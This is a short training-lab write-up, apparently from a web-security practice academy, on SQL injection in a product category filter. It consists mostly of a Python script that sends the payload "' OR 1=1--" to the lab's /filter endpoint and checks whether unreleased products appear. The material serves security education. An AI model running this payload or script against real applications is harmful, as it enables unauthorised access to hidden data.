# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
> This lab contains a SQL injection vulnerability in the product category filter. When the user 
> selects a category, the application carries out a SQL query like the following:
> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
   To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

```python
import requests

#CONFIGURATION
#Note: The Lab URL changes on every restart. Update this manually.
base_url = "https://0ac400040449bf0080242b38006e0001.web-security-academy.net"
path = "/filter"
target_url = base_url + path

print(f"[*] Target: {target_url}")

#STEP 1: ESTABLISH BASELINE
# We send a request without parameters to see the default response size.
# In this lab, Missing parameters likely return an empty list or error message
print("[*] Establishing baseline...")
baseline_response = requests.get(target_url)
baseline_length = len(baseline_response.text)

print(f"[*] Baseline Length: {baseline_length} bytes")

#STEP 2: CONFIGURE PAYLOAD
#Goal: Inject the payload into the WHERE clause to retrieve all records.
#Syntax: ' closes the string. OR 1=1 makes the condition true. -- comments out the rest.
payload = {"category": "' OR 1=1--"}

#STEP 3: EXECUTE ATTACK
print(f"[*] Executing payload: {payload['category']}")
#Using params= automaticlaly URL-encodes the payload
attack_response = requests.get(target_url,params=payload)

#STEP 4: VERIFY SUCCESS
#Logic: If the injection works, the server returns All products (released + unreleased)
#This should result in a response body significantly larger than baseline
if attack_response.status_code == 200:
	if len(attack_response.text) > baseline_length:
		print("[*] SUCCESS: Response Length increased. Hidden data retrieved.")
		print(f"[*] New Length: {len(attack_response.text)} bytes")
	else:
		print("[-] FAILURE: Response length did not change.")
else:
	print(f"[-] ERROR: Server returned status code {attack_response.status_code}")
```